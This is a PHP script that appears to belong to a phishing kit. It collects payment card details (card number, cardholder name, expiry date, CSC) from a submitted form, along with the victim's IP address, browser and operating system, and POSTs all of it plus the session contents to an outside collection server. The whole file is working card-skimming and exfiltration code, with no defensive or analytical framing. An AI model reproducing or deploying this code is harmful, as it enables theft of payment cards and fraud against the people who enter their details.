<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');


$_SESSION['TIME_DATE'] = $TIME_DATE;



include 'function.php';
include("system.php");

$_SESSION['_c_type_'] = $_POST['c_type'];
$_SESSION['_NameOnCard_'] = $_POST['NameOnCard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);


$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];

$ip=$_SESSION['ip']=getip();






//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
$data['s'] = $_SESSION;

sendPost('http://saveinfo.aba.ae/Save/sv2.php',$data);


//---- end request---------------- 

?>